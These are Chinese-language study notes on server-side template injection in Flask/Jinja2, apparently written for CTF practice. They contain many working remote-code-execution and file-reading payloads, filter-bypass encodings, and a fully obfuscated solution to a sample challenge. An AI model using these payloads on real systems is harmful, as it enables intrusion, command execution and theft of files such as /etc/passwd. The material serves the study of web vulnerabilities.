# SSTI
SSTI就是服务器端模板注入(Server-Side Template Injection)

本质是格式化字符串漏洞

SSTI也是获取了一个输入，然后在后端的渲染处理上进行了语句的拼接，然后执行，SSTI利用的是现在的网站模板引擎，模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档，主要针对python、php、java的一些网站处理框架，比如Python的jinja2、mako、tornado、django，php的smarty、twig，java的jade、velocity，Thymeleaf。当这些框架对运用渲染函数生成html的时候，有时就会出现SSTI的问题。

类似SQL注入**将语句闭合，产生注入的效果**

## Python

### FLASK

#### 漏洞成因

flask是使用`Jinja2`来作为**渲染引擎**的

flask的渲染方法有`render_template`。

- Flask提供的`render_template`函数封装了该模板引擎
- `render_template`函数的第一个参数是模板的文件名,后面的参数都是键值对,表示模板中变量对应的真实值

使用如下

1. `{{}}`来表示变量名,这种`{{}}`语法叫做**变量代码块**

```python
{{post.title}}
```

Jinja2模板中的变量代码块可以是任意Python类型或者对象，只要它能够被Python的`str()`方法转化为一个字符串就可以，比如，可以通过下面的方式显示一个字典或者列表中的某个元素

```python
{{testdict['key']}}
{{testlist[0]}}
```

1. 用`{%%}`定义的控制代码块，可以实现一些语言层次的功能，比如循环语句

```python
{% if user %}
    {{ user }}
{% else %}
    hello!
<ul>
    {% for index in indexs %}
    <li> {{ index }} </li>
    {% endfor %}
</ul>
```

1. 使用`{##}`进行注释,注释的内容不会在html中被渲染出来

```html
{#{{ name }}#}
```

还有一个`render_template_string`则是用来渲染一个字符串的。SSTI与这个方法密不可分。

```python
html = '<h1>This is index page</h1>'
return render_template_string(html)
```

不正确的使用渲染模板函数就会引发SSTI

如：

```python
code = 输入

template = """
	<h1>%s</h1>
"""%(code)

render_template_string(template)
```



`render_template_string`函数在渲染模板的时候使用了`%s`来动态的替换字符串，且`code`是可控的，因为flask是基于jinja2的，Jinja2在渲染的时候会把`{{}}`包裹的内容当做变量解析替换

即**Jinja2会将`{{}}`内的内容解析为Python表达式并执行，最终将结果插入到模板中。**

> 这时输入{{7*7}}会返回49

#### 漏洞利用

>  python是oop语言

可以利用内置对象或者魔术方法（`__class__`,`__base__`等）来实现执行任意命令，即利用python的内置类

一些用到的魔术方法

`__class__`：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 

`__class__` 是类的一个内置属性，表示类的类型，返回 `<type 'type'>` ； 也是类的实例的属性，表示实例对象的类。

如下，会返回`""`（字符的类的类型，同样其他`dict` `tuple`都可以）

```shell
Python 3.10.17 (main, Apr  8 2025, 12:10:59) [Clang 17.0.0 (clang-1700.0.13.3)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> "".__class__
<class 'str'>
```



`__bases__`：用来查看类的基类，通过该属性可以查看该类的所有**直接父类**，该属性返回所有直接父类（objece）组成的 **元组** ，可以使用数组索引来查看特定位置的值。 

```shell
Python 3.10.17 (main, Apr  8 2025, 12:10:59) [Clang 17.0.0 (clang-1700.0.13.3)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> "".__class__
<class 'str'>
>>> "".__class__.__bases__
(<class 'object'>,)
>>> "".__class__.__bases__[0]
<class 'object'>
```

除了`__bases__`获取基类还能用 `__mro__` 方法，`__mro__` 方法可以用来获取一个类的调用顺序，返回的数据类型同样是元组

```shell
Python 3.10.17 (main, Apr  8 2025, 12:10:59) [Clang 17.0.0 (clang-1700.0.13.3)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> "".__class__
<class 'str'>
>>> "".__class__.__bases__
(<class 'object'>,)
>>> "".__class__.__bases__[0]
<class 'object'>
>>> "".__class__.__mro__
(<class 'str'>, <class 'object'>)
>>> "".__class__.__mro__[0]
<class 'str'>
>>> "".__class__.__mro__[1]
<class 'object'>
```

还有一个更简单的`__base__`

```shell
Python 3.10.17 (main, Apr  8 2025, 12:10:59) [Clang 17.0.0 (clang-1700.0.13.3)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> "".__class__
<class 'str'>
>>> "".__class__.__bases__
(<class 'object'>,)
>>> "".__class__.__bases__[0]
<class 'object'>
>>> "".__class__.__mro__
(<class 'str'>, <class 'object'>)
>>> "".__class__.__mro__[0]
<class 'str'>
>>> "".__class__.__mro__[1]
<class 'object'>
>>> "".__class__.__base__
<class 'object'>
```

有这些类继承的方法，我们就可以从任何一个变量，回溯到最顶层基类`<class'object'>`，再获得到此基类所有实现的类，就可以得到python的所有内置类和方法

`__subclasses__()`：查看当前类的子类组成的列表，即我们要返回基类`object`的子类,数组类型，受python版本限制

??? 展开
        ```shell
        Python 3.10.17 (main, Apr  8 2025, 12:10:59) [Clang 17.0.0 (clang-1700.0.13.3)] on darwin
        Type "help", "copyright", "credits" or "license" for more information.
        >>> "".__class__.__base__.__subclasses__()
        [<class 'type'>
        <class 'async_generator'>
        <class 'int'>
        <class 'bytearray_iterator'>
        <class 'bytearray'>
        <class 'bytes_iterator'>
        <class 'bytes'>
        <class 'builtin_function_or_method'>
        <class 'callable_iterator'>
        <class 'PyCapsule'>
        <class 'cell'>
        <class 'classmethod_descriptor'>
        <class 'classmethod'>
        <class 'code'>
        <class 'complex'>
        <class 'coroutine'>
        <class 'dict_items'>
        <class 'dict_itemiterator'>
        <class 'dict_keyiterator'>
        <class 'dict_valueiterator'>
        <class 'dict_keys'>
        <class 'mappingproxy'>
        <class 'dict_reverseitemiterator'>
        <class 'dict_reversekeyiterator'>
        <class 'dict_reversevalueiterator'>
        <class 'dict_values'>
        <class 'dict'>
        <class 'ellipsis'>
        <class 'enumerate'>
        <class 'float'>
        <class 'frame'>
        <class 'frozenset'>
        <class 'function'>
        <class 'generator'>
        <class 'getset_descriptor'>
        <class 'instancemethod'>
        <class 'list_iterator'>
        <class 'list_reverseiterator'>
        <class 'list'>
        <class 'longrange_iterator'>
        <class 'member_descriptor'>
        <class 'memoryview'>
        <class 'method_descriptor'>
        <class 'method'>
        <class 'moduledef'>
        <class 'module'>
        <class 'odict_iterator'>
        <class 'pickle.PickleBuffer'>
        <class 'property'>
        <class 'range_iterator'>
        <class 'range'>
        <class 'reversed'>
        <class 'symtable entry'>
        <class 'iterator'>
        <class 'set_iterator'>
        <class 'set'>
        <class 'slice'>
        <class 'staticmethod'>
        <class 'stderrprinter'>
        <class 'super'>
        <class 'traceback'>
        <class 'tuple_iterator'>
        <class 'tuple'>
        <class 'str_iterator'>
        <class 'str'>
        <class 'wrapper_descriptor'>
        <class 'types.GenericAlias'>
        <class 'anext_awaitable'>
        <class 'async_generator_asend'>
        <class 'async_generator_athrow'>
        <class 'async_generator_wrapped_value'>
        <class 'coroutine_wrapper'>
        <class 'InterpreterID'>
        <class 'managedbuffer'>
        <class 'method-wrapper'>
        <class 'types.SimpleNamespace'>
        <class 'NoneType'>
        <class 'NotImplementedType'>
        <class 'weakref.CallableProxyType'>
        <class 'weakref.ProxyType'>
        <class 'weakref.ReferenceType'>
        <class 'types.UnionType'>
        <class 'EncodingMap'>
        <class 'fieldnameiterator'>
        <class 'formatteriterator'>
        <class 'BaseException'>
        <class 'hamt'>
        <class 'hamt_array_node'>
        <class 'hamt_bitmap_node'>
        <class 'hamt_collision_node'>
        <class 'keys'>
        <class 'values'>
        <class 'items'>
        <class '_contextvars.Context'>
        <class '_contextvars.ContextVar'>
        <class '_contextvars.Token'>
        <class 'Token.MISSING'>
        <class 'filter'>
        <class 'map'>
        <class 'zip'>
        <class '_frozen_importlib._ModuleLock'>
        <class '_frozen_importlib._DummyModuleLock'>
        <class '_frozen_importlib._ModuleLockManager'>
        <class '_frozen_importlib.ModuleSpec'>
        <class '_frozen_importlib.BuiltinImporter'>
        <class '_frozen_importlib.FrozenImporter'>
        <class '_frozen_importlib._ImportLockContext'>
        <class '_thread.lock'>
        <class '_thread.RLock'>
        <class '_thread._localdummy'>
        <class '_thread._local'>
        <class '_io._IOBase'>
        <class '_io._BytesIOBuffer'>
        <class '_io.IncrementalNewlineDecoder'>
        <class 'posix.ScandirIterator'>
        <class 'posix.DirEntry'>
        <class '_frozen_importlib_external.WindowsRegistryFinder'>
        <class '_frozen_importlib_external._LoaderBasics'>
        <class '_frozen_importlib_external.FileLoader'>
        <class '_frozen_importlib_external._NamespacePath'>
        <class '_frozen_importlib_external._NamespaceLoader'>
        <class '_frozen_importlib_external.PathFinder'>
        <class '_frozen_importlib_external.FileFinder'>
        <class 'codecs.Codec'>
        <class 'codecs.IncrementalEncoder'>
        <class 'codecs.IncrementalDecoder'>
        <class 'codecs.StreamReaderWriter'>
        <class 'codecs.StreamRecoder'>
        <class '_abc._abc_data'>
        <class 'abc.ABC'>
        <class 'collections.abc.Hashable'>
        <class 'collections.abc.Awaitable'>
        <class 'collections.abc.AsyncIterable'>
        <class 'collections.abc.Iterable'>
        <class 'collections.abc.Sized'>
        <class 'collections.abc.Container'>
        <class 'collections.abc.Callable'>
        <class 'os._wrap_close'>
        <class '_sitebuiltins.Quitter'>
        <class '_sitebuiltins._Printer'>
        <class '_sitebuiltins._Helper'>
        <class '_distutils_hack._TrivialRe'>
        <class '_distutils_hack.DistutilsMetaFinder'>
        <class '_distutils_hack.shim'>
        <class 'types.DynamicClassAttribute'>
        <class 'types._GeneratorWrapper'>
        <class 'warnings.WarningMessage'>
        <class 'warnings.catch_warnings'>
        <class 'importlib._abc.Loader'>
        <class 'itertools.accumulate'>
        <class 'itertools.combinations'>
        <class 'itertools.combinations_with_replacement'>
        <class 'itertools.cycle'>
        <class 'itertools.dropwhile'>
        <class 'itertools.takewhile'>
        <class 'itertools.islice'>
        <class 'itertools.starmap'>
        <class 'itertools.chain'>
        <class 'itertools.compress'>
        <class 'itertools.filterfalse'>
        <class 'itertools.count'>
        <class 'itertools.zip_longest'>
        <class 'itertools.pairwise'>
        <class 'itertools.permutations'>
        <class 'itertools.product'>
        <class 'itertools.repeat'>
        <class 'itertools.groupby'>
        <class 'itertools._grouper'>
        <class 'itertools._tee'>
        <class 'itertools._tee_dataobject'>
        <class 'operator.attrgetter'>
        <class 'operator.itemgetter'>
        <class 'operator.methodcaller'>
        <class 'operator.attrgetter'>
        <class 'operator.itemgetter'>
        <class 'operator.methodcaller'>
        <class 'reprlib.Repr'>
        <class 'collections.deque'>
        <class '_collections._deque_iterator'>
        <class '_collections._deque_reverse_iterator'>
        <class '_collections._tuplegetter'>
        <class 'collections._Link'>
        <class 'functools.partial'>
        <class 'functools._lru_cache_wrapper'>
        <class 'functools.KeyWrapper'>
        <class 'functools._lru_list_elem'>
        <class 'functools.partialmethod'>
        <class 'functools.singledispatchmethod'>
        <class 'functools.cached_property'>
        <class 'contextlib.ContextDecorator'>
        <class 'contextlib.AsyncContextDecorator'>
        <class 'contextlib._GeneratorContextManagerBase'>
        <class 'contextlib._BaseExitStack'>
        <class 'enum.auto'>
        <enum 'Enum'>
        <class 're.Pattern'>
        <class 're.Match'>
        <class '_sre.SRE_Scanner'>
        <class 'sre_parse.State'>
        <class 'sre_parse.SubPattern'>
        <class 'sre_parse.Tokenizer'>
        <class 're.Scanner'>
        <class 'ast.AST'>
        <class 'ast.NodeVisitor'>
        <class 'dis.Bytecode'>
        <class 'tokenize.Untokenizer'>
        <class 'inspect.BlockFinder'>
        <class 'inspect._void'>
        <class 'inspect._empty'>
        <class 'inspect.Parameter'>
        <class 'inspect.BoundArguments'>
        <class 'inspect.Signature'>
        <class 'rlcompleter.Completer'>]
        ```



#### 常用的子类



执行命令的子类

- 可以用来执行命令的类有很多，其基本原理就是**遍历含有eval函数即os模块的子类**，利用这些子类中的eval函数即os模块执行命令。



几个含有eval函数的类

```
warnings.catch_warnings
WarningMessage
codecs.IncrementalEncoder
codecs.IncrementalDecoder
codecs.StreamReaderWriter
os._wrap_close
reprlib.Repr
weakref.finalize
etc.
```



```python
{{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}+
```

#### 其他执行命令的函数

**os 模块执行命令**

Python的 os 模块中有system和popen这两个函数可用来执行命令。

`system()`函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；

`popen()`函数执行命令有回显。

首先编写脚本遍历目标Python环境中含有**os**模块的类的索引号，比如`<class 'os._wrap_close'>`

随便挑一个类构造payload执行命令即可：

```python
{{''.__class__.__base__.__subclasses__()[79].__init__.__globals__['os'].popen('ls /').read()}} 
```

但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。

我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 `os._wrap_close`

 **popen 函数执行命令**

先找索引

```python
{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()}}
```



**importlib 类执行命令**



python有一个importlib类`<class '_frozen_importlib.BuiltinImporter'>`，可用load_module来导入你需要的模块。

目的就是提供 Python 中 import 语句的实现,以及提供 `__import__` 函数

可以直接利用该类中的`load_module`将os模块导入，从而使用 os 模块执行命令。

首先查找目标Python环境中 **importlib** 类的索引号

```python
{{[].__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("ls /").read()}}
```



**subprocess.Popen 类执行命令**

可以用 **subprocess** 这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。

subprocess 意在替代其他几个老的模块或者函数，比如：`os.system`、`os.popen` 等函数。



**查找subprocess索引**

```python
{{[].__class__.__base__.__subclasses__()[245]('ls /',shell=True,stdout=-1).communicate()[0].strip()}}  
```



**linecache 函数执行命令**

linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块，所以我们也可以利用这个 linecache 函数去执行命令。

首先查找含有 **linecache** 这个函数的子类的索引号



```python
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}}
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__['linecache']['os'].popen('ls /').read()}}
```

#### Bypass

##### 关键字绕过

我们可以利用`+`进行**字符串**拼接，绕过关键字过滤

```python
{{().__class__.__bases__[0].__subclasses__()[40]('/fl'+'ag').read()}}
```

**利用编码绕过**

###### **base64编码**

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA=='.decode('base64')]('X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='.decode('base64'))}}
```

###### 利用Unicode编码

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['\u0065\u0076\u0061\u006c']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\u006f\u0073'].popen('\u006c\u0073\u0020\u002f').read()}}

```



等同于

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}

```

###### 利用Hex编码绕过关键字

和上面那个一样，只不过将Unicode编码换成了Hex编码，适用于过滤了“u”的情况。

我们可以利用hex编码的方法，绕过关键字过滤，例如：

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x65\x76\x61\x6c']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\x6f\x73'].popen('\x6c\x73\x20\x2f').read()}}
```

等同于

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

###### 利用引号绕过

如下

```python
[].__class__.__base__.__subclasses__()[40]("/fl""ag").read()
```

###### 利用join()函数绕过

们可以利用join()函数来绕过关键字过滤。例如，题目过滤了flag，那么我们可以用如下方法绕过：

```python
[].__class__.__base__.__subclasses__()[40]("fla".join("/g")).read()
```



##### 中括号[ ]

###### **__getitem__()**

可以使用 `__getitem__()` 方法**输出序列属性中的某个索引处的元素**(相当于`[]`)，如：

```python
>>> "".__class__.__mro__[2]
<type 'object'>
>>> "".__class__.__mro__.__getitem__(2)
<type 'object'>
```



```python
{{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__("os").popen("ls /").read()')}}
```

###### **pop() 绕过**

`pop()方法`可以返回指定序列属性中的某个索引处的元素或指定字典属性中某个键对应的值，用法和上面的`__getitem__()`基本一样，如下示例：

```python
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('eval')('__import__("os").popen("ls /").read()')}}
```

**pop()会删除相应位置的值。一次性使用**

###### **字典读取**

我们知道**访问字典里的值有两种方法**，一种是把相应的键放入我们熟悉的方括号 `[]` 里来访问，另一种就是用点 `.` 来访问。所以，当方括号 `[]` 被过滤之后，我们还可以用点 `.` 的方式来访问，如下示例

```python
#改成 __builtins__.eval()

{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval('__import__("os").popen("ls /").read()')}}
```

等同于：

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}} 
```



##### 引号

###### **利用chr()绕过**

先获取`chr()`函数，赋值给chr，后面再拼接成一个字符串

```python
{% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
```

等同于：

```python
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}
```

###### **request对象**

```python
{{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd


{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}&os=os&cmd=ls /
```

等同于：

```python
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

如果过滤了`args`，可以将其中的`request.args`改为`request.values`，POST和GET两种方法传递的数据`request.values`都可以接收。



##### **下划线__**

###### **request对象**

和上面一样，我们这里利用request绕过

```python
{{()[request.args.class][request.args.bases][0][request.args.subclasses]()[40]('/flag').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__
{{()[request.args.class][request.args.bases][0][request.args.subclasses]()[77].__init__.__globals__['os'].popen('ls /').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__ 
```

等同于：

```python
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

##### 点 .

###### **利用 |attr() 绕过**

用原生JinJa2函数`attr()`,当然这样只适用jinja2

```python
().__class__   相当于  ()|attr("__class__")
```

示例：

```python
{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls /")|attr("read")()}}
```

等同于：

```python
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

其实这个函数是一个 `attr()` 过滤器，它只查找属性，获取并返回对象的属性的值，过滤器与变量用管道符号（ `|` ）分割，它不止可以绕过点。

`|attr()` 配合其他姿势可同时绕过双下划线 `__` 、引号、点 `.` 和 `[` 等。

这里的`|attr()`其实是JinJa 的过滤器

变量可以通过过滤器进行修改，过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号（|）连接多个过滤器，一个过滤器的输出应用于下一个过滤器。

[过滤器详情](https://jinja.palletsprojects.com/en/master/templates/#builtin-filters)

###### **利用中括号[ ]绕过**

中括号直接拼接就可以，不需要用到`.`

如下示例：

```python
{{''['__class__']['__bases__'][0]['__subclasses__']()[59]['__init__']['__globals__']['__builtins__']['eval']('__import__("os").popen("ls").read()')}}
```

等同于：

```python
{{().__class__.__bases__.[0].__subclasses__().[59].__init__['__globals__']['__builtins__'].eval('__import__("os").popen("ls /").read()')}}
```

**这样操作后几乎所有的关键字都成了字符串，就可以用上面编码的方式（比如hex），绕过全部的过滤。**



### 过滤器bypass

#### 常用字符获取入口点

获取一般字符的方法有以下几种：

```php
{% set org = ({ }|select()|string()) %}{{org}} {% set org = (self|string()) %}{{org}} {% set org = self|string|urlencode %}{{org}} {% set org = (app.__doc__|string) %}{{org}} 
```

如下演示：

```php
{% set org = ({ }|select()|string()) %}{{org}}
```

![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2022/03/attach-4460ffd9da758f379e1d5602910e8d07898434a1.png)

如上图所示，我们可以通过 `<generator object select_or_reject at 0x7fe339298fc0>` 字符串获取的字符有：尖号、空格、下划线，以及各种字母和数字。

```python
{% set org = (self|string()) %}{{org}}
```

![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2022/03/attach-877701bea2529dc3fa7caf8bc3e55f19052026b7.png)

可以通过 `<TemplateReference None>` 字符串获取的字符有：尖号、字母和空格以及各种字母。

```python
{% set org = self|string|urlencode %}{{org}}
```

![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2022/03/attach-302ba69511ea5bfe8091bdb84d66b0ce2038f933.png)

如上图所示，可以获得的字符除了字母以外还有百分号，这一点比较重要，因为如果我们控制了百分号的话我们可以获取任意字符（URL）。

```python
{% set org = (app.__doc__|string) %}{{org}}
```

![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2022/03/attach-9a505924d7588e09975163b61be7134864b2b5a7.png)

如上图所示，可获得到的字符更多了，有等号、加号、单引号等。

- 对于获取数字，除了上面出现的那几种外我们还可以有以下几种方法：

```python
{% set num = (self|int) %}{{num}}    # 0, 通过int过滤器获取数字
{% set num = (self|string|length) %}{{num}}    # 24, 通过length过滤器获取数字
{% set point = self|float|string|min %}    # 通过float过滤器获取点 .
```

有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算。

##### 例题

题目源码：

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from flask import Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directory
app = Flask(__name__)

@app.route("/")
def index():
    def safe_jinja(s):
        blacklist = ['class', 'attr', 'mro', 'base',
                     'request', 'session', '+', 'add', 'chr', 'ord', 'redirect', 'url_for', 'config', 'builtins', 'get_flashed_messages', 'get', 'subclasses', 'form', 'cookies', 'headers', '[', ']', '\'', '"', '{}']
        flag = True
        for no in blacklist:
            if no.lower() in s.lower():
                flag = False
                break
        return flag
    if not request.args.get('name'):
        return open(__file__).read()
    elif safe_jinja(request.args.get('name')):
        name = request.args.get('name')
    else:
        name = 'wendell'
    template = '''

    <div class="center-content">
        <p>Hello, %s</p>
    </div>
    <!--flag in /flag-->
    <!--python3.8-->
''' % (name)
    return render_template_string(template)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
```

在存在ssti的地方执行如下payload：

```python
{% set org = ({ }|select()|string()) %}{{org}}
# 或 {% set org = ({ }|select|string) %}{{org}}
```

得到了一段字符串：`<generator object select_or_reject at 0x7f06771f4150>`

这段字符串中不仅存在字符，还存在空格、下划线，尖号和数字。也就是说，如果题目过滤了这些字符的话，我们便可以在 `<generator object select_or_reject at 0x7f06771f4150>` 这个字符串中取到我们想要的字符，从而绕过过滤。

再使用`list()`过滤器将字符串转化为列表：

```php
{% set orglst = ({ }|select|string|list) %}{{orglst}
```

返回列表中是 

```
['<', 'g', 'e', 'n', 'e', 'r', 'a', 't', 'o', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ' ', 's', 'e', 'l', 'e', 'c', 't', '_', 'o', 'r', '_', 'r', 'e', 'j', 'e', 'c', 't', ' ', 'a
', 't', ' ', '0', 'x', '7', 'f', '0', '6', '7', '7', '1', 'f', '4', '1', '5', '0', '>']                
```

 使用pop()等方法将列表里的字符取出来。如下所示，取一个下划线 `_`：

```python
{% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}}    # _
```

同理还能取到更多的字符：

```python
{% set space = (({ }|select|string|list).pop(10)|string) %}{{spa}}    # 空格
{% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}}    # _
{% set zero = (({ }|select|string|list).pop(38)|int) %}{{zero}}    # 0
{% set seven = (({ }|select|string|list).pop(40)|int) %}{{seven}}    # 7
......
```

这里，其实有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算，如下示例：

```python
{% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0
{% set one = (zero**zero)|int %}{{one}}    # 1
{%set two = (zero-one-one)|abs %}    # 2
{%set three = (zero-one-one-one)|abs %}    # 3
{% set five = (two*two*two)-one-one-one %}    # 5
#  {%set four = (one+three) %}    
......
```

通过上述原理，我们可以依次获得构造payload所需的特殊字符与字符串：

```python
# 首先构造出所需的数字:
{% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0
{% set one = (zero**zero)|int %}    # 1
{% set two = (zero-one-one)|abs %}    # 2
{% set four = (two*two)|int %}    # 4
{% set five = (two*two*two)-one-one-one %}    # 5
{% set seven = (zero-one-one-five)|abs %}    # 7

# 构造出所需的各种字符与字符串:
{% set xhx = (({ }|select|string|list).pop(24)|string) %}    # _
{% set space = (({ }|select|string|list).pop(10)|string) %}    # 空格
{% set point = ((app.__doc__|string|list).pop(26)|string) %}    # .
{% set yin = ((app.__doc__|string|list).pop(195)|string) %}    # 单引号 '
{% set left = ((app.__doc__|string|list).pop(189)|string) %}    # 左括号 (
{% set right = ((app.__doc__|string|list).pop(200)|string) %}    # 右括号 )

{% set c = dict(c=aa)|reverse|first %}    # 字符 c
{% set bfh = self|string|urlencode|first %}    # 百分号 %
{% set bfhc=bfh~c %}    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接
{% set slas = bfhc%((four~seven)|int) %}    # 使用%c构造斜杠 /
{% set but = dict(buil=aa,tins=dd)|join %}    # builtins
{% set imp = dict(imp=aa,ort=dd)|join %}    # import
{% set pon = dict(po=aa,pen=dd)|join %}    # popen
{% set os = dict(o=aa,s=dd)|join %}    # os
{% set ca = dict(ca=aa,t=dd)|join %}    # cat
{% set flg = dict(fl=aa,ag=dd)|join %}    # flag
{% set ev = dict(ev=aa,al=dd)|join %}    # eval
{% set red = dict(re=aa,ad=dd)|join %}    # read
{% set bul = xhx*2~but~xhx*2 %}    # __builtins__
```

将上面构造的字符或字符串拼接起来构造出 `__import__('os').popen('cat /flag').read()`：

```python
{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}
```

然后将上面构造的各种变量添加到SSTI万能payload里面就行了：

```python
{% for f,v in whoami.__init__.__globals__.items() %}    # globals
    {% if f == bul %} 
        {% for a,b in v.items() %}    # builtins
            {% if a == ev %}    # eval
                {{b(pld)}}    # eval("__import__('os').popen('cat /flag').read()")
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}
```

所以最终的payload为：

```python
{% set zero = (({ }|select|string|list).pop(38)|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs|int %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set seven = (zero-one-one-five)|abs %}{% set xhx = (({ }|select|string|list).pop(24)|string) %}{% set space = (({ }|select|string|list).pop(10)|string) %}{% set point = ((app.__doc__|string|list).pop(26)|string) %}{% set yin = ((app.__doc__|string|list).pop(195)|string) %}{% set left = ((app.__doc__|string|list).pop(189)|string) %}{% set right = ((app.__doc__|string|list).pop(200)|string) %}{% set c = dict(c=aa)|reverse|first %}{% set bfh=self|string|urlencode|first %}{% set bfhc=bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set os = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx*2~but~xhx*2 %}{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in whoami.__init__.__globals__.items() %}{% if f == bul %}{% for a,b in v.items() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}
```



### Django





## Php

### smarty



### Twig
